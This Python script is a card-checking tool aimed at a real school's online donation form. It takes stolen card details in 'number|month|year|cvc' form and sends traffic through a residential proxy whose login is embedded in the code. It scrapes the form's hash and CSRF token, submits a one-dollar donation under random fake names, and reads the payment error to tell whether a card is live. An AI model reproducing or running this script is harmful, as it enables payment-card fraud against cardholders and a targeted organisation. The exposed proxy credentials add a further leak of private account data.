import requests,re
import random
import string
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_d4a33102-zone-scrapping:brgtmv5nyk7u"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	if n.startswith("4"):
		type = "Visa"
	if n.startswith("5"):
		type = "Mastercard"
	r = requests.session()
	
	random_amount1 = random.randint(1, 9)
	random_amount2 = random.randint(1, 99)
	
	random1 = random.choice(string.ascii_letters)
	random2 = random.choice(string.ascii_letters)
	random3 = random.choice(string.ascii_letters)
	random4 = random.choice(string.ascii_letters)
	random5 = random.choice(string.ascii_letters)
	random6 = random.choice(string.ascii_letters)
	random7 = random.choice(string.ascii_letters)
	random8 = random.choice(string.ascii_letters)
	
	first = f'{random1}{random2}{random3}{random4}'
	last = f'{random5}{random6}{random7}{random8}'
	
	cookies = {
	    'PHPSESSID': '4142f3c37c6efb05b389d2861d',
	}
	
	headers = {
	    'authority': 'www.oakwoodfriends.org',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'cache-control': 'max-age=0',
	    'referer': 'https://www.google.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'cross-site',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	response = session.get(
	    'https://www.oakwoodfriends.org/forms/lighting-the-way-campaign-donation-to-oakwood-friends-school/',
	    cookies=cookies,
	    headers=headers,
	)
	
	hash = re.search(r'name="hash" value="(.*?)"', response.text).group(1)
	csrf = re.search(r'name="csrfToken" value="(.*?)"', response.text).group(1)
	
	cookies = {
	    'PHPSESSID': '4142f3c37c6efb05b389d2861d',
	    '_gid': 'GA1.2.317092951.1754024640',
	    '_ga_EQG0DHYGHS': 'GS2.1.s1754022338$o1$g1$t1754024639$j39$l0$h0',
	    '_ga': 'GA1.1.746156273.1754024640',
	}
	
	headers = {
	    'authority': 'www.oakwoodfriends.org',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://www.oakwoodfriends.org',
	    'referer': 'https://www.oakwoodfriends.org/forms/lighting-the-way-campaign-donation-to-oakwood-friends-school/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	params = {
	    'formProcessed': 'Donate_Lighting-the-Way',
	}
	
	data = {
	    'formField_donation_select': 'other',
	    'formField_other_amount': '1',
	    'formField_bill_firstname': f'{first}',
	    'formField_bill_lastname': f'{last}',
	    'formField_bill_address1': 'Street 27',
	    'formField_bill_city': 'New York',
	    'formField_bill_state': 'NY',
	    'formField_bill_zip': '10014',
	    'formField_Name': 'Rodam User',
	    'formField_Affiliation': 'Other',
	    'formField_class_year': '1',
	    'formField_Phone': '4303000850',
	    'formField_Email': f'genpaypal{random_amount1}{random_amount2}@gmail.com',
	    'formField_Comments': '',
	    'formPayment_method': 'Credit Card',
	    'formPayment_card': f'{type}',
	    'formPayment_owner': f'{first} {last}',
	    'formPayment_number': f'{n}',
	    'formPayment_cvv': f'{cvc}',
	    'formMeta_formPayment_expiration': 'expiration',
	    'formPayment_expiration[]': [
	        f'{mm}',
	        f'20{yy}',
	    ],
	    'formPayment_gateway': '',
	    'formPayment_total_payment': '1',
	    'formField_TotalDonationAmount': '',
	    'hash': f'{hash}',
	    'csrfToken': f'{csrf}',
	    'edit_id': '0',
	    'module': '',
	    'src': 'forms',
	    'srctype': 'process',
	    'id': 'Donate_Lighting-the-Way',
	    'fs_id': 'Donate_Lighting-the-Way',
	}
	
	response = session.post('https://www.oakwoodfriends.org/index.php', params=params, cookies=cookies, headers=headers, data=data)
	
	try:
		result = re.search(r'Payment error:</b> (.*?)<\/div>', response.text).group(1)
	except:
		result = re.search(r'&nbsp;e-mail (.*?) to <a', response.text).group(1)
		
	return (result)
